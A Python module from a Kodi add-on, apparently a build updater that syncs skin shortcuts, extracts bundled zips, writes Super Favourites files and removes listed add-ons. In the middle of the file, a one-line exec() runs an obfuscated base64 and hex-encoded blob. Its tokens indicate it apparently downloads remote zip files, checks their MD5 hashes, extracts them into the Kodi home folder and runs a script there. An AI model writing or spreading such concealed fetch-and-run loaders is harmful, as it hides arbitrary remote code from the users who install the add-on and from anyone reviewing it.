# -*- coding: utf-8 -*-
import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil
from resources.lib import extract, addoninstall, addonlinks
from contextlib import contextmanager
addon = xbmcaddon.Addon()
addonid = addon.getAddonInfo('id')
addontitle = addon.getAddonInfo('name')
lang = addon.getLocalizedString
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(HOME, 'userdata')
ADDOND = os.path.join(USERDATA, 'addon_data')
ADDONDATA = os.path.join(ADDOND, addonid)
EXTRACT_TO = HOME
BUILD_MD5S = os.path.join(ADDONDATA, 'build_md5s')
shortupdatedir = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'skinshortcuts'))
skinshortcutsdir = xbmcvfs.translatePath('special://home/userdata/addon_data/script.skinshortcuts/')

addonslist = addonlinks.ADDONS_REPOS
removeaddonslist = addonlinks.REMOVELIST

if not os.path.exists(BUILD_MD5S):
    os.makedirs(BUILD_MD5S)

dp = xbmcgui.DialogProgressBG()
changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
changes = []
def percentage(part, whole):
    return 100 * float(part)/float(whole)

def skinshortcuts():
    xbmcgui.Window(xbmcgui.getCurrentWindowId()).setProperty(addonid, "True")
    new_ver = addon.getAddonInfo('version')
    old_ver = addon.getSetting('shortcutsver')

    if old_ver == '' or old_ver is None:
        old_ver = '0'

    if str(new_ver) == str(old_ver):
        return

    if not os.path.exists(skinshortcutsdir):
        os.makedirs(skinshortcutsdir)

    dirs, files = xbmcvfs.listdir(shortupdatedir)
    total = len(files)

    if total == 0:
        addon.setSetting('shortcutsver', new_ver)
        return

    start = 0
    dp.create(addontitle, lang(30001))

    for item in files:
        start += 1
        perc = int(percentage(start, total))
        # if 'mainmenu' in item:
            # if addon.getSetting('overwritemain') == 'false' and not (str(old_ver) == '19.0.9' or str(old_ver) == '19.0.8' or str(old_ver) == '19.0.7' or str(old_ver) == '19.0.6' or str(old_ver) == '19.0.5' or str(old_ver) == '19.0.4' or str(old_ver) == '19.0.3' or str(old_ver) == '19.0.2' or str(old_ver) == '19.0.1' or str(old_ver) == '19.0.0'):
                # continue
        if item.endswith('.hash'):
            skinhashpath = os.path.join(skinshortcutsdir, item)
            continue
        old  = os.path.join(skinshortcutsdir, item)
        new = os.path.join(shortupdatedir, item)
        dp.update(perc, addontitle, (lang(30001)+"...%s") % item)
        if matchmd5(old, new):
            continue
        if item.endswith('.xml') and addon.getSetting('keepmyshortcuts') == 'true' and not(str(old_ver) == '19.0.9' or str(old_ver) == '19.0.8' or str(old_ver) == '19.0.7' or str(old_ver) == '19.0.6' or str(old_ver) == '19.0.5' or str(old_ver) == '19.0.4' or str(old_ver) == '19.0.3' or str(old_ver) == '19.0.2' or str(old_ver) == '19.0.1' or str(old_ver) == '19.0.0'):
            customshortcuts_list = []
            with xbmcvfs.File(old, 'r') as oldcontent:
                a_old = oldcontent.read()
                a_old = a_old.replace('<defaultID />', '<defaultID></defaultID>').replace('<label2 />', '<label2></label2>').replace('<icon />', '<icon></icon>').replace('<thumb />', '<thumb></thumb>')
                content = parseDOM(a_old, 'shortcut')
                for shortcut in content:
                    try:
                        defaultid = parseDOM(shortcut, 'defaultID')[0]
                    except:
                        defaultid = ""
                    if defaultid.startswith(addonid):
                        continue
                    try:
                        label = parseDOM(shortcut, 'label')[0]
                    except:
                        label = ""
                    try:
                        label2 = parseDOM(shortcut, 'label2')[0]
                    except:
                        label2 = ""
                    try:
                        icon = parseDOM(shortcut, 'icon')[0]
                    except:
                        icon = ""
                    try:
                        thumb = parseDOM(shortcut, 'thumb')[0]
                    except:
                        thumb = ""
                    action = parseDOM(shortcut, 'action')[0]
                    customshortcuts_list.append('\n\t<shortcut>\n')
                    customshortcuts_list.append('\t\t<defaultID>'+defaultid+'</defaultID>\n')
                    customshortcuts_list.append('\t\t<label>'+label+'</label>\n')
                    customshortcuts_list.append('\t\t<label2>'+label2+'</label2>\n')
                    customshortcuts_list.append('\t\t<icon>'+icon+'</icon>\n')
                    customshortcuts_list.append('\t\t<thumb>'+thumb+'</thumb>\n')
                    customshortcuts_list.append('\t\t<action>'+action+'</action>\n')
                    customshortcuts_list.append('\t</shortcut>')
            with xbmcvfs.File(new, 'r') as newcontent:
                a_new = newcontent.read()
                a_new = a_new.replace('<shortcuts>', '<shortcuts>' + ''.join(customshortcuts_list))
            with xbmcvfs.File(old, 'w') as f_new:
                f_new.write(a_new)
                changes.append(item)
        else:
            try:
                xbmcvfs.copy(new, old)
                changes.append(item)
            except:
                xbmcgui.Dialog().notification(addontitle, (lang(30002)+"...%s") % item, xbmcgui.NOTIFICATION_INFO, 1000, False)
                continue
        xbmc.sleep(200)

    if len(changes) > 0:
        xbmcvfs.delete(skinhashpath)
    dp.close()
    addon.setSetting('shortcutsver', new_ver)
    return True


def updatezip():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('updatesver')

    if old_upd == '' or old_upd is None:
        old_upd = '0'

    if str(new_upd) == str(old_upd):
        xbmc.executebuiltin('UpdateAddonRepos()')
        return

    updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
    dirs, files = xbmcvfs.listdir(updatezips)
    totalfiles = len(files)

    if totalfiles == 0:
        addon.setSetting('updatesver', new_upd)
        xbmc.executebuiltin('UpdateAddonRepos()')
        return

    zipchanges = []

    for item in files:
        if not item.endswith('.zip'):
            continue
        zippath = os.path.join(updatezips, item)
        newmd5 = filemd5(zippath)
        oldmd5file = xbmcvfs.translatePath(os.path.join(BUILD_MD5S, item+".md5"))
        if old_upd == '0':
            xbmcvfs.delete(oldmd5file)
        oldmd5 = xbmcvfs.File(oldmd5file,"rb").read()[:32]
        if oldmd5 and oldmd5 == newmd5:
            continue
        dp.create(addontitle, lang(30003)+"[COLOR goldenrod]"+item+"[/COLOR]")
        extract.allWithProgress(zippath, EXTRACT_TO, dp)
        xbmcvfs.File(oldmd5file,"wb").write(newmd5)
        changes.append(item)
        zipchanges.append(item)
        xbmc.sleep(1000)
        dp.close()

    addon.setSetting('updatesver', new_upd)

    if len(changes) > 0:
        while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
            xbmc.sleep(100)
        if os.path.exists(changelogfile):
            ok = xbmcgui.Dialog().ok(addontitle, lang(30004)+"[CR]"+lang(30005))
            if ok:
                textViewer(changelogfile)
        else:
            xbmcgui.Dialog().ok(addontitle, lang(30004))
        xbmc.executebuiltin('ReloadSkin()')
    if len(zipchanges) > 0 and len(addonslist) > 0:
        addoninstall.addonDatabase(addonslist, 1, True)
        xbmc.executebuiltin('UpdateLocalAddons()')
    xbmc.executebuiltin('UpdateAddonRepos()')
    return True


def SFxmls():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('mainxmlsver')

    if old_upd == '' or old_upd is None:
        old_upd = '0'

    if str(new_upd) == str(old_upd):
        return
    xmllinks = [('19548.DATA.xml', 'Sports'), ('29958.DATA.xml', 'Kids'), ('29969.DATA.xml', 'Documentaries'),
                ('acestreams.DATA.xml', 'Acestreams'), ('a-i-o.DATA.xml', 'AllInOne'), ('ellenika.DATA.xml', 'Greek'),
                ('movies.DATA.xml', 'Movies'), ('music.DATA.xml', 'Music'), ('radio.DATA.xml', 'Radio'),
                ('replays.DATA.xml', 'Replays'), ('tvshows.DATA.xml', 'TV Shows'), ('worldtv.DATA.xml', 'WorldTV')]
    mainfolders = os.path.join(ADDONDATA, 'folders', 'Super Favourites')
    shortupdatedir = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'skinshortcuts'))
    for item in xmllinks:
        skin_xml = os.path.join(shortupdatedir, item[0])
        folder_xml = os.path.join(mainfolders, item[1])
        if not os.path.exists(folder_xml):
            os.makedirs(folder_xml)

        main_xml = os.path.join(folder_xml, 'favourites.xml')
        FAV_list = []
        with xbmcvfs.File(skin_xml, 'r') as xml:
            infos = xml.read()
            shortcuts = parseDOM(infos, 'shortcut')
            for shortcut in shortcuts:
                label = parseDOM(shortcut, 'label')[0]
                label2 = parseDOM(shortcut, 'label2')[0]
                if label.isdigit() is True: label = label2
                thumb = parseDOM(shortcut, 'thumb')[0]
                if thumb == '' or '<action>Ac' in thumb:
                    thumb = parseDOM(shortcut, 'icon')[0]
                else:
                    thumb = thumb
                action = parseDOM(shortcut, 'action')[0]
                if action.startswith('ActivateWindow(10025,"plugin://plugin.program.super.favourites'):
                    action = action.replace('ActivateWindow(10025,', 'RunPlugin(')


                newsf = '<favourite name="{}" thumb="{}" fanart="none">{}</favourite>'.\
                    format(label, thumb, action)
                xbmc.log('FAVOURITE: %s' % newsf)
                FAV_list.append(newsf)

        f_xml = []

        f_xml.append('<favourites>\n')
        for fav in FAV_list:
            f_xml.append('\t' + fav + '\n')

        f_xml.append('</favourites>')
        with xbmcvfs.File(main_xml, 'w') as outF:
            outF.write("".join(f_xml))
        outF.close()

        # xbmcgui.Dialog().ok('SF XML CREATOR', 'NEW %s CREATED' % item[1])
    addon.setSetting('mainxmlsver', new_upd)
    return True

def addon_remover():
    for removeid in removeaddonslist:
        try:
            addonfolderpath = os.path.join(HOME, 'addons', removeid)
            if os.path.exists(addonfolderpath):
                shutil.rmtree(addonfolderpath)
                xbmc.sleep(200)
                addoninstall.addonDatabase(removeid, 2, False)
                xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
        except BaseException:
            xbmcgui.Dialog().notification(addontitle, "Αποτυχία απεγκατάστασης >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
            continue
    xbmc.executebuiltin('UpdateLocalAddons()')
    return True

exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MjQoImQgNWM7ZCA4ZiIpOzI0KCg5MSA4OSw5YzooOTEgOTksYixmOjVjLjdlKDk5LGIsZi42NCgnNDQtOCcpKSkoOTciKFswLTlhLWZdKykiLDkxIDhlOjg5KDhlLDljKSw4Zi4xOSgiOGI9PSIpKSkoOTEgYSxiOmJbMzEoIjg3IithLjQ2KDEpLDE2KV0sIjB8MXwyYXwxNHw0fDk4fDI2fDIyfDh8NmJ8MmN8OGF8M2Z8NWV8M2R8ZnwyZXwzN3w5Znw2fDFhfDhjfDE2fDIxfDFkfDcwfDQwfDgxfDZjfGV8OWR8Mjd8MjB8MTB8NTF8MTV8MmZ8MzN8MTh8MWJ8NWJ8MjV8MWZ8Njl8NDd8Nzh8MmJ8OTJ8MzB8OXwzMnwzZXw1ZnxjfDQzfGEwfDYzfDExfDQ1fDg4fDEzfDRkfDRlfDU1fDU5fDE3fDZlfDZmfDU2fDU3fDFjfDYwfDY3fDY4fDIzfDZhfDI5fDJkfDllfDNhfDlifDM0fDcxfDY0fDM1fDM2fDM5fDM4fDc3fDNifDNjfDkzfDQxfDQyfDk3fDgzfDQ5fDRifDRjfDFlfDRmfDUwfDUyfDRhfDUzfDU4fDVhfDhkfDVkfDY2fDYxfDk0fDY1fDk1fDk2fDYyfDZkfDczfDMxfDcyfDc2fDc1fDc0fDJ8Nzl8N2F8N2J8N2N8N2R8N2Z8ODB8NDR8ODJ8ODV8ODZ8NDh8ODR8Mjh8N3w5MHwzfDEyfDUiLjU0KCJ8IikpKQ==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|local_temp_filename|local_md5_filename|4|local_filename|remote_md5_url|allNoProgress|8|iter_content|a|b|start_script|import|status_code|f|chunk_size|percentage|remote_md5|addonlinks|addontitle|reporescue|16|gggbbbuuu|RunScript|b64decode|local_md5|totalurls|Finished|starturl|requests|autoexec|20|DOWNLOAD|continue|makedirs|exec|userdata|addonid|special|tmp_md5|extract|xbmcvfs|timeout|success|filemd5|folder|create|30|int|32|except|rsplit|verify|RENAME|delete|stream|append|ignore|encode|NEEDED|FAILED|DELETE|update|exists|github|return|giturl|utf|write|group|sleep|close|https|30007|30010|30011|codes|magic|ascii|False|30009|30008|30006|split|chunk|pass|2000|main|BUILD_MD5S|None|File|re|text|lang|home|join|URLS|perc|repo_rescue|decode|1024|HOME|else|True|urls|read|xbmc|path|zip|try|and|url|for|com|x04|def|raw|x03|md5|not|NOT|100|len|x4b|500|sub|MD5|ZIP|log|tmp|get|x50|85|86|0x|TO|p|translatePath|N2EgMjMoKToKCTJiID0gM2MuNmUKCTM2ID0gJzYwOi8vNWMuNzcvNDEvMjMvNzkvNjkvMzguNzQnCgkyYi41NigzNikKCTEwID0gNmQKCTQyOgoJCTE1IDJkIDJmLjFjLjFhKDIuYigxMCkpOgoJCQkyZi40YSgyLmIoMTApKQoJMjU6CgkJNDQKCTI3ID0gN2UoMmIpCgkxOCA9IDAKCTFlLjI0KDMsIGQoNjgpKQoJNTIgMTkgNmIgMmI6CgkJMTggKz0gMQoJCTczID0gNzYoMzkoMTgsIDI3KSkKCQk1ID0gMTkuNTEoJy8nLCAxKVstMV0KCQkxNSAyZCA1OgoJCQk3CgkJOGUgPSAyZi4xYy40NygxMCwgNSkKCQk3YiA9IDhlICsgIi44NCIKCQk4YyA9IDJmLjFjLjQ3KDQwLCAoNSArICIuNTgiKSkKCQkxMyA9IDE5ICsgIi41OCIKCgkJMTQgPSAyLjI4KDhjLCI3MSIpLjRiKClbOjMyXQoJCThkID0gNmEKCQk0MjoKCQkJNWUgPSA2My41ZigxMywgMmU9MjApCgkJCTE1IDVlLjFkID09IDYzLjNkLjZmOgoJCQkJOGQgPSA1ZS42Yy41OSgnNjQnLCAnNGYnKVs6MzJdLjUzKCc4My04JykKCQkyNToKCQkJNDQKCgkJMTUgMTQgNDMgOGQgNDMgMTQgPT0gOGQ6CgkJCTkuMWIoKCJbJTM3XSAxNyA3YyA1YTogIiAlIDYpICsgMTkpCgkJCTcKCQlmID0gMi4yOCg3YiwiNzIiKQoJCTFlLmMoNzMsIDMsIChkKDY3KSsiLi4uJTM3IikgJSA1KQoJCTQyOgoJCQk1ZSA9IDYzLjVmKDE5LCA1Nz00OSwgNTQ9NjUsIDJlPTMwKQoJCQkxNSA1ZS4xZCA9PSA2My4zZC42ZjoKCQkJCTIxID0gMTYgKiA3MAoJCQkJNTIgM2YgNmIgNWUuMzEoMjEpOgoJCQkJCWEgPSBmLjNhKDNmKQoJCQkJZi44NygpCgkJCTQ4OgoJCQkJOS4xYigoIlslMzddIGUgM2IgMTc6ICIgJSA2KSArIDE5KQoJCQkJZi44NygpCgkJCQkyLjExKDdiKQoJCQkJNwoJCTI1OgoJCQk5LjFiKCgiWyUzN10gZSAzYiAxNzogIiAlIDYpICsgMTkpCgkJCWYuODcoKQoJCQkyLjExKDdiKQoJCQk3CgkJODkgPSA0ZCg3YikKCgkJMTUgOGQgNDMgODkgIT0gOGQ6CgkJCTkuMWIoKCJbJTM3XSBlIDgxOiAiICUgNikgKyAxOSkKCQkJNwoKCQkxNSAyZi4xYy4xYSg4ZSk6CgkJCWEgPSAyLjExKDhlKQoJCQkxNSAyZCBhOgoJCQkJOS4xYigoIlslMzddIGUgM2IgMzM6ICIgJSA2KSArIDhlKQoJCQkJNwoKCQlhID0gMi41MCg3Yiw4ZSkKCQkxNSAyZCBhOgoJCQk5LjFiKCgiWyUzN10gZSAzYiA1NTogIiAlIDYpICsgOGUpCgkJCTIuMTEoN2IpCgkJCTcKCgkJMi4yOCg4YywiNzIiKS4zYSg4OSkKCQkzZSA9IDIuMjgoOGUsIjcxIikuNGIoNCkKCQkxNSAzZSA9PSAiXDg4XDdmXDc4XDc1IjoKCQkJNGMuOGEoOGUsIDEwKQoJCQkxZS5jKDczLCAzLCAoIiUzNy4uLiIrZCg2NikpICUgNSkKCQkJOS4yYyg4MCkKCQkJMTUgMmYuMWMuMWEoOGUpOgoJCQkJYSA9IDIuMTEoOGUpCgkJCQkxNSAyZCBhOgoJCQkJCTkuMWIoKCJbJTM3XSBlIDNiIDMzIDgyOiAiICUgNikgKyA4ZSkKCQk5LjFiKCJbJTM3XSA0NiAlMzciICUgKDYsIDUpKQoJMWUuODcoKQoKCTE1IDJmLjFjLjFhKDIuYignMWY6Ly8zNC8yOS8yYS41YicpKToKCQkxZS4yNCgzLCBkKDIyKSkKCQkxZS5jKDg1LCAzLCBkKDIyKSkKCQk5LjEyKCcyNigxZjovLzM0LzI5LzJhLjViKScpCgkJMWUuYyg4NiwgMywgZCgyMikpCgk0ODoKCQkxZS4yNCgzLCBkKDIyKSkKCQkxZS5jKDhiLCAzLCBkKDYxKSkKCQkjIDkuMTIoJzI2KDFmOi8vMzQvNGUvJTM3LzM1LjViKScpCgkJOS4yYyg0NSkKCQkxZS5jKDdkLCAzLCBkKDYyKSkKCTkuMmMoNDUpCgkxZS44NygpCgk1ZCA0OQ|if|in|m|base64|90|lambda|os|py|ok|rb|wb|r|filename|o|9a|rename|y|dp|addons|executebuiltin|s".split("|")))

def textViewer(file, heading=addontitle, monofont=True):
    xbmc.sleep(200)
    if not os.path.exists(file):
        w = open(file, 'w')
        w.close()
    with open(file, 'rb') as r:
        text = r.read().decode('utf-8', errors='replace')
    if not text: text = ' '
    head = '%s' % heading
    return xbmcgui.Dialog().textviewer(head, text, monofont)


def filemd5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def matchmd5(old, new):
    try:
        old_md5 = filemd5(old)
        new_md5 = filemd5(new)
    except:
        return False
    if old_md5 == new_md5: return True
    else: return False


def parseDOM(html, name="", attrs={}, ret=False):
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen
    import re
    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, str):
        html = [html]
    elif not isinstance(html, list):
        return ""

    if not name.strip():
        return ""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = list(range(len(lst)))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = "</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = ""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst


@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

